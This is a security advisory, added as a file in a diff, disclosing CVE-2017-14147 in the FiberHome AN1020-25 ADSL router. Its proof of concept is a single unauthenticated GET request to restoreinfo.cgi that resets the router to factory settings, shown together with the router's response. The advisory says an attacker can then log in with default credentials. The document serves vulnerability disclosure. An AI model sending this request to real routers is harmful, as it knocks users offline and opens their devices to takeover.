@@ -1,0 +1,135 @@
+Title:
+====
+
+FiberHome Unauthenticated ADSL Router Factory Reset.
+
+Credit:
+======
+
+Name: Ibad Shah
+Twitter: @BeeFaauBee09
+Website: beefaaubee09.github.io
+
+
+CVE:
+=====
+
+CVE-2017-14147
+
+Date:
+====
+
+05-09-2017 (dd/mm/yyyy)
+
+About FiberHome:
+======
+
+FiberHome Technologies is a leading equipment vendor and global solution provider the field of information technology and telecommunications. FiberHome Deals in fiber-optic communications, data networking communications, wireless communication, and intelligentizing applications. In particular, it has been providing end-to-end solutions integrated with opto-electronic devices, opticpreforms, fiber & cables, and optical communication systems to many countries around the world.
+
+Products & Services:
+Wireless 3G/4G broadband devices
+Custom engineered technologies
+Broadband devices
+
+URL : http://www.fiberhomegroup.com/
+
+
+Description:
+=======
+
+This vulnerability in AN1020-25 router enables an anonymous unauthorized attacker to bypass authentication & access Resetting Router to Factory Settings, resulting in un-authorized operation & resetting it to Factory state. It later allows attacker to login to Router's Main Page with default username & password. 
+
+
+
+Affected Device Model:
+=============
+
+FiberHome ADSL AN1020-25
+
+
+Exploitation-Technique:
+===================
+
+Remote
+
+
+Details:
+=======
+
+Below listed vulnerability enables an anonymous unauthorized attacker to reset router to it's factory settings & further access router admin page with default credentials.
+
+1) Bypass authentication and gain unauthorized access vulnerability - CVE-2017-14147
+
+Vulnerable restoreinfo.cgi
+
+
+
+Proof Of Concept:
+================
+
+PoC : 
+
+GET /restoreinfo.cgi HTTP/1.1
+Host: 192.168.1.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Connection: close
+
+
+HTTP/1.1 200 Ok
+Server: micro_httpd
+Cache-Control: no-cache
+Date: Sat, 01 Jan 2000 00:12:39 GMT
+Content-Type: text/html
+Connection: close
+
+<html>
+<head>
+<meta HTTP-EQUIV='Pragma' CONTENT='no-cache'>
+<link rel=stylesheet href='stylemain.css' type='text/css'>
+<link rel=stylesheet href='colors.css' type='text/css'>
+<script language="javascript">
+<!-- hide
+
+function restore() {
+   var enblPopWin = '0';
+   var loc = 'main.html';
+   var code = 'window.top.location="' + loc + '"';
+
+   if ( enblPopWin == '1' ) {
+      loc = 'index.html';
+      code = 'location="' + loc + '"';
+   }
+
+   eval(code);
+}
+
+function frmLoad() {
+   setTimeout("restore()", 60000);
+}
+
+// done hiding -->
+</script>
+</head>
+
+<body onLoad='frmLoad()'>
+<blockquote>
+<b>DSL Router Restore</b><br><br>
+The DSL Router configuration has been restored to default settings and the
+router is rebooting.<br><br>
+Close the DSL Router Configuration window and wait for 2 minutes before
+reopening your web browser. If necessary, reconfigure your PC's IP address to
+match your new configuration.
+</blockquote>
+</body>
+</html>
+
+
+
+Credits:
+=======
+
+Ibad Shah, Taimooor Zafar, Owais Mehtab
